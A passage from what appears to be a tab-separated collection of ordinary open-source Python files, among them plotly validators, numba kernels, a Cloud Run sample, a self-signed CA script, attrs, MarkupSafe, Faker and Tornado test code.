                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD240	JD240-min_max_.py	"""""""
Numba 1D min/max kernels that can be shared by
* Dataframe / Series
* groupby
* rolling / expanding

Mirrors pandas/_libs/window/aggregation.pyx
""""""
from __future__ import annotations

import numba
import numpy as np


@numba.jit(nopython=True, nogil=True, parallel=False)
def sliding_min_max(
    values: np.ndarray,
    start: np.ndarray,
    end: np.ndarray,
    min_periods: int,
    is_max: bool,
) -> np.ndarray:
    N = len(start)
    nobs = 0
    output = np.empty(N, dtype=np.float64)
    # Use deque once numba supports it
    # https://github.com/numba/numba/issues/7417
    Q: list = []
    W: list = []
    for i in range(N):

        curr_win_size = end[i] - start[i]
        if i == 0:
            st = start[i]
        else:
            st = end[i - 1]

        for k in range(st, end[i]):
            ai = values[k]
            if not np.isnan(ai):
                nobs += 1
            elif is_max:
                ai = -np.inf
            else:
                ai = np.inf
            # Discard previous entries if we find new min or max
            if is_max:
                while Q and ((ai >= values[Q[-1]]) or values[Q[-1]] != values[Q[-1]]):
                    Q.pop()
            else:
                while Q and ((ai <= values[Q[-1]]) or values[Q[-1]] != values[Q[-1]]):
                    Q.pop()
            Q.append(k)
            W.append(k)

        # Discard entries outside and left of current window
        while Q and Q[0] <= start[i] - 1:
            Q.pop(0)
        while W and W[0] <= start[i] - 1:
            if not np.isnan(values[W[0]]):
                nobs -= 1
            W.pop(0)

        # Save output based on index in input value array
        if Q and curr_win_size > 0 and nobs >= min_periods:
            output[i] = values[Q[0]]
        else:
            output[i] = np.nan

    return output"
JD333	JD333-main.py	"# Copyright 2019 Google, LLC.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START cloudrun_broken_service]
# [START run_broken_service]
import json
import os

from flask import Flask


app = Flask(__name__)


@app.route(""/"", methods=[""GET""])
def index():
    print(""hello: received request."")

    # [START cloudrun_broken_service_problem]
    # [START run_broken_service_problem]
    NAME = os.getenv(""NAME"")

    if not NAME:
        print(""Environment validation failed."")
        raise Exception(""Missing required service parameter."")
    # [END run_broken_service_problem]
    # [END cloudrun_broken_service_problem]

    return f""Hello {NAME}""


# [END run_broken_service]
# [END cloudrun_broken_service]


@app.route(""/improved"", methods=[""GET""])
def improved():
    print(""hello: received request."")

    # [START cloudrun_broken_service_upgrade]
    # [START run_broken_service_upgrade]
    NAME = os.getenv(""NAME"")

    if not NAME:
        NAME = ""World""
        error_message = {
            ""severity"": ""WARNING"",
            ""message"": f""NAME not set, default to {NAME}"",
        }
        print(json.dumps(error_message))
    # [END run_broken_service_upgrade]
    # [END cloudrun_broken_service_upgrade]

    return f""Hello {NAME}""


# [START cloudrun_broken_service]
# [START run_broken_service]
if __name__ == ""__main__"":
    PORT = int(os.getenv(""PORT"")) if os.getenv(""PORT"") else 8080

    # This is used when running locally. Gunicorn is used to run the
    # application on Cloud Run. See entrypoint in Dockerfile.
    app.run(host=""127.0.0.1"", port=PORT, debug=True)
# [END run_broken_service]
# [END cloudrun_broken_service]"
JY524	JY524-ca-create.py	"#!/usr/bin/env python3

import datetime

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

public_key = private_key.public_key()

pem_private = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)

pem_public = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

with open('/tmp/ca.key', 'wb') as out:
    out.write(pem_private)

with open('/tmp/ca.pub', 'wb') as out:
    out.write(pem_public)

print('Created files in /tmp/ca.key /tmp/ca.pub /tmp/ca.cert')

# Various details about who we are. For a self-signed certificate the
# subject and issuer are always the same.
subject = issuer = x509.Name([
    x509.NameAttribute(NameOID.COUNTRY_NAME, ""AR""),
    x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, ""BA""),
    x509.NameAttribute(NameOID.LOCALITY_NAME, ""Buenos Aires""),
    x509.NameAttribute(NameOID.ORGANIZATION_NAME, ""Vulpy by Securetia""),
    x509.NameAttribute(NameOID.COMMON_NAME, ""www.securetia.com""),
])

cert = x509.CertificateBuilder().subject_name(subject)
cert = cert.issuer_name(issuer)
cert = cert.public_key(public_key)
cert = cert.serial_number(x509.random_serial_number())
cert = cert.not_valid_before(datetime.datetime.utcnow())
cert = cert.not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=30))
cert = cert.sign(private_key, hashes.SHA256(), default_backend())

# Write our certificate out to disk.
with open('/tmp/ca.cert', 'wb') as out:
    out.write(cert.public_bytes(serialization.Encoding.PEM))
"
JY239	JY239-U76.py	"from viktor._vendor import libcst

from viktor._vendor.libcst import matchers as m

from viktor._codemod.helpers import match_controller_class


class Visitor(libcst.CSTVisitor):
    pass


class Transformer(libcst.CSTTransformer):

    def __init__(self, visitor):
        super().__init__()

        self.OptionField_ImportAlias = None

    def leave_ImportAlias_asname(self, node) -> None:
        if node.name.value == ""OptionField"":
            if node.asname:
                self.OptionField_ImportAlias = node.asname.name.value

    def leave_ClassDef(self, original_node, updated_node):

        if not match_controller_class(original_node):
            return updated_node

        body = updated_node.body
        new_statements = []
        for statement in body.body:
            if m.matches(statement, m.SimpleStatementLine()):
                try:
                    target = statement.body[0].targets[0].target
                    if target.value.startswith('viktor_'):
                        continue
                except AttributeError:  # 'targets' not present
                    pass

            new_statements.append(statement)

        body = body.with_changes(body=new_statements)

        return updated_node.with_changes(body=body)

    def leave_Call(self, node, updated_node):

        try:
            if node.func.value not in (self.OptionField_ImportAlias, ""OptionField""):
                return updated_node
        except AttributeError:  # func may not have 'value'
            return updated_node

        new_args = []
        for arg_index, arg in enumerate(node.args):

            if arg.keyword is not None:
                if arg.keyword.value == 'autoselect_single_option' and arg.value.value == 'False':
                    continue
            new_args.append(arg)

        new_args[-1] = new_args[-1].with_changes(comma=None)

        return updated_node.with_changes(args=new_args)"
JD226	JD226-dual.py	"""""""
Aliases for functions which may be accelerated by Scipy.

Scipy_ can be built to use accelerated or otherwise improved libraries
for FFTs, linear algebra, and special functions. This module allows
developers to transparently support these accelerated functions when
scipy is available but still support users who have only installed
NumPy.

.. _Scipy : https://www.scipy.org

""""""
# This module should be used for functions both in numpy and scipy if
#  you want to use the numpy version if available but the scipy version
#  otherwise.
#  Usage  --- from numpy.dual import fft, inv

__all__ = ['fft', 'ifft', 'fftn', 'ifftn', 'fft2', 'ifft2',
           'norm', 'inv', 'svd', 'solve', 'det', 'eig', 'eigvals',
           'eigh', 'eigvalsh', 'lstsq', 'pinv', 'cholesky', 'i0']

import numpy.linalg as linpkg
import numpy.fft as fftpkg
from numpy.lib import i0
import sys


fft = fftpkg.fft
ifft = fftpkg.ifft
fftn = fftpkg.fftn
ifftn = fftpkg.ifftn
fft2 = fftpkg.fft2
ifft2 = fftpkg.ifft2

norm = linpkg.norm
inv = linpkg.inv
svd = linpkg.svd
solve = linpkg.solve
det = linpkg.det
eig = linpkg.eig
eigvals = linpkg.eigvals
eigh = linpkg.eigh
eigvalsh = linpkg.eigvalsh
lstsq = linpkg.lstsq
pinv = linpkg.pinv
cholesky = linpkg.cholesky

_restore_dict = {}

def register_func(name, func):
    if name not in __all__:
        raise ValueError(""{} not a dual function."".format(name))
    f = sys._getframe(0).f_globals
    _restore_dict[name] = f[name]
    f[name] = func

def restore_func(name):
    if name not in __all__:
        raise ValueError(""{} not a dual function."".format(name))
    try:
        val = _restore_dict[name]
    except KeyError:
        return
    else:
        sys._getframe(0).f_globals[name] = val

def restore_all():
    for name in _restore_dict.keys():
        restore_func(name)"
JY136	JY136-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'j M Y'                   # '25 Oct 2006'
TIME_FORMAT = 'P'                       # '2:30 p.m.'
DATETIME_FORMAT = 'j M Y, P'            # '25 Oct 2006, 2:30 p.m.'
YEAR_MONTH_FORMAT = 'F Y'               # 'October 2006'
MONTH_DAY_FORMAT = 'j F'                # '25 October'
SHORT_DATE_FORMAT = 'd/m/Y'             # '25/10/2006'
SHORT_DATETIME_FORMAT = 'd/m/Y P'       # '25/10/2006 2:30 p.m.'
FIRST_DAY_OF_WEEK = 1                   # Monday

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%d/%m/%Y', '%d/%m/%y',             # '25/10/2006', '25/10/06'
    # '%b %d %Y', '%b %d, %Y',          # 'Oct 25 2006', 'Oct 25, 2006'
    # '%d %b %Y', '%d %b, %Y',          # '25 Oct 2006', '25 Oct, 2006'
    # '%B %d %Y', '%B %d, %Y',          # 'October 25 2006', 'October 25, 2006'
    # '%d %B %Y', '%d %B, %Y',          # '25 October 2006', '25 October, 2006'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',                # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',             # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',                   # '2006-10-25 14:30'
    '%d/%m/%Y %H:%M:%S',                # '25/10/2006 14:30:59'
    '%d/%m/%Y %H:%M:%S.%f',             # '25/10/2006 14:30:59.000200'
    '%d/%m/%Y %H:%M',                   # '25/10/2006 14:30'
    '%d/%m/%y %H:%M:%S',                # '25/10/06 14:30:59'
    '%d/%m/%y %H:%M:%S.%f',             # '25/10/06 14:30:59.000200'
    '%d/%m/%y %H:%M',                   # '25/10/06 14:30'
]
DECIMAL_SEPARATOR = '.'
THOUSAND_SEPARATOR = ','
NUMBER_GROUPING = 3"
JD188	JD188-iolang.py	"""""""
    pygments.lexers.iolang
    ~~~~~~~~~~~~~~~~~~~~~~

    Lexers for the Io language.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer
from pygments.token import Comment, Operator, Keyword, Name, String, Number, \
    Whitespace

__all__ = ['IoLexer']


class IoLexer(RegexLexer):
    """"""
    For Io (a small, prototype-based programming language) source.

    .. versionadded:: 0.10
    """"""
    name = 'Io'
    url = 'http://iolanguage.com/'
    filenames = ['*.io']
    aliases = ['io']
    mimetypes = ['text/x-iosrc']
    tokens = {
        'root': [
            (r'\n', Whitespace),
            (r'\s+', Whitespace),
            # Comments
            (r'//(.*?)$', Comment.Single),
            (r'#(.*?)$', Comment.Single),
            (r'/(\\\n)?[*](.|\n)*?[*](\\\n)?/', Comment.Multiline),
            (r'/\+', Comment.Multiline, 'nestedcomment'),
            # DoubleQuotedString
            (r'""(\\\\|\\[^\\]|[^""\\])*""', String),
            # Operators
            (r'::=|:=|=|\(|\)|;|,|\*|-|\+|>|<|@|!|/|\||\^|\.|%|&|\[|\]|\{|\}',
             Operator),
            # keywords
            (r'(clone|do|doFile|doString|method|for|if|else|elseif|then)\b',
             Keyword),
            # constants
            (r'(nil|false|true)\b', Name.Constant),
            # names
            (r'(Object|list|List|Map|args|Sequence|Coroutine|File)\b',
             Name.Builtin),
            (r'[a-zA-Z_]\w*', Name),
            # numbers
            (r'(\d+\.?\d*|\d*\.\d+)([eE][+-]?[0-9]+)?', Number.Float),
            (r'\d+', Number.Integer)
        ],
        'nestedcomment': [
            (r'[^+/]+', Comment.Multiline),
            (r'/\+', Comment.Multiline, '#push'),
            (r'\+/', Comment.Multiline, '#pop'),
            (r'[+/]', Comment.Multiline),
        ]
    }"
JY284	JY284-genericworker.py	"#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
#    Copyright (C) 2022 by YOUR NAME HERE
#
#    This file is part of RoboComp
#
#    RoboComp is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    RoboComp is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with RoboComp.  If not, see <http://www.gnu.org/licenses/>.

import sys, Ice, os
from PySide2 import QtWidgets, QtCore

ROBOCOMP = ''
try:
    ROBOCOMP = os.environ['ROBOCOMP']
except KeyError:
    print('$ROBOCOMP environment variable not set, using the default value /opt/robocomp')
    ROBOCOMP = '/opt/robocomp'

Ice.loadSlice(""-I ./src/ --all ./src/CommonBehavior.ice"")
import RoboCompCommonBehavior




class GenericWorker(QtCore.QObject):

    kill = QtCore.Signal()

    def __init__(self, mprx):
        super(GenericWorker, self).__init__()

        self.people_proxy = mprx[""PeopleProxy""]
        self.people1_proxy = mprx[""PeopleProxy1""]
        self.peoplepub_proxy = mprx[""PeoplePub""]

        self.mutex = QtCore.QMutex(QtCore.QMutex.Recursive)
        self.Period = 30
        self.timer = QtCore.QTimer(self)


    @QtCore.Slot()
    def killYourSelf(self):
        rDebug(""Killing myself"")
        self.kill.emit()

    # \brief Change compute period
    # @param per Period in ms
    @QtCore.Slot(int)
    def setPeriod(self, p):
        print(""Period changed"", p)
        self.Period = p
        self.timer.start(self.Period)"
JY71	JY71-__init__.py	"# SPDX-License-Identifier: MIT

import sys
import warnings

from functools import partial

from . import converters, exceptions, filters, setters, validators
from ._cmp import cmp_using
from ._config import get_run_validators, set_run_validators
from ._funcs import asdict, assoc, astuple, evolve, has, resolve_types
from ._make import (
    NOTHING,
    Attribute,
    Factory,
    attrib,
    attrs,
    fields,
    fields_dict,
    make_class,
    validate,
)
from ._next_gen import define, field, frozen, mutable
from ._version_info import VersionInfo


if sys.version_info < (3, 7):  # pragma: no cover
    warnings.warn(
        ""Running attrs on Python 3.6 is deprecated & we intend to drop ""
        ""support soon. If that's a problem for you, please let us know why & ""
        ""we MAY re-evaluate: <https://github.com/python-attrs/attrs/pull/993>"",
        DeprecationWarning,
    )

__version__ = ""22.2.0""
__version_info__ = VersionInfo._from_version_string(__version__)

__title__ = ""attrs""
__description__ = ""Classes Without Boilerplate""
__url__ = ""https://www.attrs.org/""
__uri__ = __url__
__doc__ = __description__ + "" <"" + __uri__ + "">""

__author__ = ""Hynek Schlawack""
__email__ = ""hs@ox.cx""

__license__ = ""MIT""
__copyright__ = ""Copyright (c) 2015 Hynek Schlawack""


s = attributes = attrs
ib = attr = attrib
dataclass = partial(attrs, auto_attribs=True)  # happy Easter ;)


class AttrsInstance:
    pass


__all__ = [
    ""Attribute"",
    ""AttrsInstance"",
    ""Factory"",
    ""NOTHING"",
    ""asdict"",
    ""assoc"",
    ""astuple"",
    ""attr"",
    ""attrib"",
    ""attributes"",
    ""attrs"",
    ""cmp_using"",
    ""converters"",
    ""define"",
    ""evolve"",
    ""exceptions"",
    ""field"",
    ""fields"",
    ""fields_dict"",
    ""filters"",
    ""frozen"",
    ""get_run_validators"",
    ""has"",
    ""ib"",
    ""make_class"",
    ""mutable"",
    ""resolve_types"",
    ""s"",
    ""set_run_validators"",
    ""setters"",
    ""validate"",
    ""validators"",
]"
JD161	JD161-main.py	"alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

def caesar(start_text, shift_amount, cipher_direction):
  end_text = """"
  if cipher_direction == ""decode"":
    shift_amount *= -1
  for char in start_text:
    #TODO-3: What happens if the user enters a number/symbol/space?
    #Can you fix the code to keep the number/symbol/space when the text is encoded/decoded?
    #e.g. start_text = ""meet me at 3""
    #end_text = ""•••• •• •• 3""
    if char in alphabet:
      position = alphabet.index(char)
      new_position = position + shift_amount
      end_text += alphabet[new_position]
    else:
      end_text += char
  print(f""Here's the {cipher_direction}d result: {end_text}"")

#TODO-1: Import and print the logo from art.py when the program starts.
from art import logo
print(logo)

#TODO-4: Can you figure out a way to ask the user if they want to restart the cipher program?
#e.g. Type 'yes' if you want to go again. Otherwise type 'no'.
#If they type 'yes' then ask them for the direction/text/shift again and call the caesar() function again?
#Hint: Try creating a while loop that continues to execute the program if the user types 'yes'.
should_end = False
while not should_end:

  direction = input(""Type 'encode' to encrypt, type 'decode' to decrypt:\n"")
  text = input(""Type your message:\n"").lower()
  shift = int(input(""Type the shift number:\n""))
  #TODO-2: What if the user enters a shift that is greater than the number of letters in the alphabet?
  #Try running the program and entering a shift number of 45.
  #Add some code so that the program continues to work even if the user enters a shift number greater than 26. 
  #Hint: Think about how you can use the modulus (%).
  shift = shift % 26

  caesar(start_text=text, shift_amount=shift, cipher_direction=direction)

  restart = input(""Type 'yes' if you want to go again. Otherwise type 'no'.\n"")
  if restart == ""no"":
    should_end = True
    print(""Goodbye"")
    "
JD460	JD460-adtn_get_mds_task.py	"#
# Copyright 2018 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
from voltha.extensions.omci.tasks.get_mds_task import GetMdsTask


class AdtnGetMdsTask(GetMdsTask):
    """"""
    OpenOMCI Get MIB Data Sync value task - Adtran ONU

    On successful completion, this task will call the 'callback' method of the
    deferred returned by the start method and return the value of the MIB
    Data Sync attribute of the ONT Data ME
    """"""
    name = ""ADTN: Get MDS Task""

    def __init__(self, omci_agent, device_id):
        """"""
        Class initialization

        :param omci_agent: (OmciAdapterAgent) OMCI Adapter agent
        :param device_id: (str) ONU Device ID
        """"""
        super(AdtnGetMdsTask, self).__init__(omci_agent, device_id)

        self.name = AdtnGetMdsTask.name
        self._device = omci_agent.get_device(device_id)
        self._omci_managed = False      # TODO: Look up capabilities/model number/check handler

    def perform_get_mds(self):
        """"""
        Get the 'mib_data_sync' attribute of the ONU
        """"""
        self.log.info('perform-get-mds')

        if self._omci_managed:
            return super(AdtnGetMdsTask, self).perform_get_mds()

        # Non-OMCI managed ADTN ONUs always return 0 for MDS, use the MIB
        # sync value and depend on an accelerated mib resync to do the
        # proper comparison

        self.deferred.callback(self._device.mib_synchronizer.mib_data_sync)
"
JD30	JD30-rotate.py	"from distutils.util import convert_path
from distutils import log
from distutils.errors import DistutilsOptionError
import os
import shutil

from setuptools import Command


class rotate(Command):
    """"""Delete older distributions""""""

    description = ""delete older distributions, keeping N newest files""
    user_options = [
        ('match=', 'm', ""patterns to match (required)""),
        ('dist-dir=', 'd', ""directory where the distributions are""),
        ('keep=', 'k', ""number of matching distributions to keep""),
    ]

    boolean_options = []

    def initialize_options(self):
        self.match = None
        self.dist_dir = None
        self.keep = None

    def finalize_options(self):
        if self.match is None:
            raise DistutilsOptionError(
                ""Must specify one or more (comma-separated) match patterns ""
                ""(e.g. '.zip' or '.egg')""
            )
        if self.keep is None:
            raise DistutilsOptionError(""Must specify number of files to keep"")
        try:
            self.keep = int(self.keep)
        except ValueError as e:
            raise DistutilsOptionError(""--keep must be an integer"") from e
        if isinstance(self.match, str):
            self.match = [
                convert_path(p.strip()) for p in self.match.split(',')
            ]
        self.set_undefined_options('bdist', ('dist_dir', 'dist_dir'))

    def run(self):
        self.run_command(""egg_info"")
        from glob import glob

        for pattern in self.match:
            pattern = self.distribution.get_name() + '*' + pattern
            files = glob(os.path.join(self.dist_dir, pattern))
            files = [(os.path.getmtime(f), f) for f in files]
            files.sort()
            files.reverse()

            log.info(""%d file(s) matching %s"", len(files), pattern)
            files = files[self.keep:]
            for (t, f) in files:
                log.info(""Deleting %s"", f)
                if not self.dry_run:
                    if os.path.isdir(f):
                        shutil.rmtree(f)
                    else:
                        os.unlink(f)"
JY430	JY430-_native.py	"import typing as t

from . import Markup


def escape(s: t.Any) -> Markup:
    """"""Replace the characters ``&``, ``<``, ``>``, ``'``, and ``""`` in
    the string with HTML-safe sequences. Use this if you need to display
    text that might contain such characters in HTML.

    If the object has an ``__html__`` method, it is called and the
    return value is assumed to already be safe for HTML.

    :param s: An object to be converted to a string and escaped.
    :return: A :class:`Markup` string with the escaped text.
    """"""
    if hasattr(s, ""__html__""):
        return Markup(s.__html__())

    return Markup(
        str(s)
        .replace(""&"", ""&amp;"")
        .replace("">"", ""&gt;"")
        .replace(""<"", ""&lt;"")
        .replace(""'"", ""&#39;"")
        .replace('""', ""&#34;"")
    )


def escape_silent(s: t.Optional[t.Any]) -> Markup:
    """"""Like :func:`escape` but treats ``None`` as the empty string.
    Useful with optional values, as otherwise you get the string
    ``'None'`` when the value is ``None``.

    >>> escape(None)
    Markup('None')
    >>> escape_silent(None)
    Markup('')
    """"""
    if s is None:
        return Markup()

    return escape(s)


def soft_str(s: t.Any) -> str:
    """"""Convert an object to a string if it isn't already. This preserves
    a :class:`Markup` string rather than converting it back to a basic
    string, so it will still be marked as safe and won't be escaped
    again.

    >>> value = escape(""<User 1>"")
    >>> value
    Markup('&lt;User 1&gt;')
    >>> escape(str(value))
    Markup('&amp;lt;User 1&amp;gt;')
    >>> escape(soft_str(value))
    Markup('&lt;User 1&gt;')
    """"""
    if not isinstance(s, str):
        return str(s)

    return s


def soft_unicode(s: t.Any) -> str:
    import warnings

    warnings.warn(
        ""'soft_unicode' has been renamed to 'soft_str'. The old name""
        "" will be removed in MarkupSafe 2.1."",
        DeprecationWarning,
        stacklevel=2,
    )
    return soft_str(s)"
JD380	JD380-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""choropleth"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY547	JY547-__init__.py	"""""""
``numpy.linalg``
================

The NumPy linear algebra functions rely on BLAS and LAPACK to provide efficient
low level implementations of standard linear algebra algorithms. Those
libraries may be provided by NumPy itself using C versions of a subset of their
reference implementations but, when possible, highly optimized libraries that
take advantage of specialized processor functionality are preferred. Examples
of such libraries are OpenBLAS, MKL (TM), and ATLAS. Because those libraries
are multithreaded and processor dependent, environmental variables and external
packages such as threadpoolctl may be needed to control the number of threads
or specify the processor architecture.

- OpenBLAS: https://www.openblas.net/
- threadpoolctl: https://github.com/joblib/threadpoolctl

Please note that the most-used linear algebra functions in NumPy are present in
the main ``numpy`` namespace rather than in ``numpy.linalg``.  There are:
``dot``, ``vdot``, ``inner``, ``outer``, ``matmul``, ``tensordot``, ``einsum``,
``einsum_path`` and ``kron``.

Functions present in numpy.linalg are listed below.


Matrix and vector products
--------------------------

   multi_dot
   matrix_power

Decompositions
--------------

   cholesky
   qr
   svd

Matrix eigenvalues
------------------

   eig
   eigh
   eigvals
   eigvalsh

Norms and other numbers
-----------------------

   norm
   cond
   det
   matrix_rank
   slogdet

Solving equations and inverting matrices
----------------------------------------

   solve
   tensorsolve
   lstsq
   inv
   pinv
   tensorinv

Exceptions
----------

   LinAlgError

""""""
# To get sub-modules
from . import linalg
from .linalg import *

__all__ = linalg.__all__.copy()

from numpy._pytesttester import PytestTester
test = PytestTester(__name__)
del PytestTester"
JY208	JY208-_testing.py	"import types
from abc import ABCMeta, abstractmethod
from collections.abc import AsyncGenerator, Iterable
from typing import Any, Callable, Coroutine, Dict, Optional, Type, TypeVar

_T = TypeVar(""_T"")


class TestRunner(metaclass=ABCMeta):
    """"""
    Encapsulates a running event loop. Every call made through this object will use the same event
    loop.
    """"""

    def __enter__(self) -> ""TestRunner"":
        return self

    def __exit__(
        self,
        exc_type: Optional[Type[BaseException]],
        exc_val: Optional[BaseException],
        exc_tb: Optional[types.TracebackType],
    ) -> Optional[bool]:
        self.close()
        return None

    @abstractmethod
    def close(self) -> None:
        """"""Close the event loop.""""""

    @abstractmethod
    def run_asyncgen_fixture(
        self,
        fixture_func: Callable[..., ""AsyncGenerator[_T, Any]""],
        kwargs: Dict[str, Any],
    ) -> ""Iterable[_T]"":
        """"""
        Run an async generator fixture.

        :param fixture_func: the fixture function
        :param kwargs: keyword arguments to call the fixture function with
        :return: an iterator yielding the value yielded from the async generator
        """"""

    @abstractmethod
    def run_fixture(
        self,
        fixture_func: Callable[..., Coroutine[Any, Any, _T]],
        kwargs: Dict[str, Any],
    ) -> _T:
        """"""
        Run an async fixture.

        :param fixture_func: the fixture function
        :param kwargs: keyword arguments to call the fixture function with
        :return: the return value of the fixture function
        """"""

    @abstractmethod
    def run_test(
        self, test_func: Callable[..., Coroutine[Any, Any, Any]], kwargs: Dict[str, Any]
    ) -> None:
        """"""
        Run an async test function.

        :param test_func: the test function
        :param kwargs: keyword arguments to call the test function with
        """""""
JD457	JD457-__init__.py	"from .. import Provider as PhoneNumberProvider


class Provider(PhoneNumberProvider):
    # as per https://en.wikipedia.org/wiki/Telephone_numbers_in_Thailand
    formats = (
        # landline (9 digits, starts with 02, 03, 04, 05, or 07)
        ""+66 2### ####"",
        ""+662 ### ####"",
        ""+66 (0) 2### ####"",
        ""02#######"",
        ""0 2### ####"",
        ""02# ######"",
        ""02#-######"",
        ""0-2###-####"",
        ""02 ### ####"",
        ""+66 3### ####"",
        ""+663 ### ####"",
        ""+66 (0) 3### ####"",
        ""03#######"",
        ""0 3### ####"",
        ""03# ######"",
        ""03#-######"",
        ""0-3###-####"",
        ""03 ### ####"",
        ""+66 4### ####"",
        ""+664 ### ####"",
        ""+66 (0) 4### ####"",
        ""04#######"",
        ""0 4### ####"",
        ""04# ######"",
        ""04#-######"",
        ""0-4###-####"",
        ""04 ### ####"",
        ""+66 5### ####"",
        ""+665 ### ####"",
        ""+66 (0) 5### ####"",
        ""05#######"",
        ""0 5### ####"",
        ""05# ######"",
        ""05#-######"",
        ""0-5###-####"",
        ""05 ### ####"",
        ""+66 7### ####"",
        ""+667 ### ####"",
        ""+66 (0) 7### ####"",
        ""07#######"",
        ""0 7### ####"",
        ""07# ######"",
        ""07#-######"",
        ""0-7###-####"",
        ""07 ### ####"",
        # mobile (10 digits, starts with 06, 08, or 09)
        ""+66 6## ### ###"",
        ""+66 (0) 6## ### ###"",
        ""06########"",
        ""0 6## ### ###"",
        ""06# ### ####"",
        ""06#-###-####"",
        ""+66 8## ### ###"",
        ""+66 (0) 8## ### ###"",
        ""08########"",
        ""0 8## ### ###"",
        ""08# ### ####"",
        ""08#-###-####"",
        ""+66 9## ### ###"",
        ""+66 (0) 9## ### ###"",
        ""09########"",
        ""0 9## ### ###"",
        ""09# ### ####"",
        ""09#-###-####"",
    )"
JD166	JD166-import_test.py	"# flake8: noqa
import subprocess
import sys
import unittest

_import_everything = b""""""
# The event loop is not fork-safe, and it's easy to initialize an asyncio.Future
# at startup, which in turn creates the default event loop and prevents forking.
# Explicitly disallow the default event loop so that an error will be raised
# if something tries to touch it.
import asyncio
asyncio.set_event_loop(None)

import tornado.auth
import tornado.autoreload
import tornado.concurrent
import tornado.escape
import tornado.gen
import tornado.http1connection
import tornado.httpclient
import tornado.httpserver
import tornado.httputil
import tornado.ioloop
import tornado.iostream
import tornado.locale
import tornado.log
import tornado.netutil
import tornado.options
import tornado.process
import tornado.simple_httpclient
import tornado.tcpserver
import tornado.tcpclient
import tornado.template
import tornado.testing
import tornado.util
import tornado.web
import tornado.websocket
import tornado.wsgi

try:
    import pycurl
except ImportError:
    pass
else:
    import tornado.curl_httpclient
""""""


class ImportTest(unittest.TestCase):
    def test_import_everything(self):
        # Test that all Tornado modules can be imported without side effects,
        # specifically without initializing the default asyncio event loop.
        # Since we can't tell which modules may have already beein imported
        # in our process, do it in a subprocess for a clean slate.
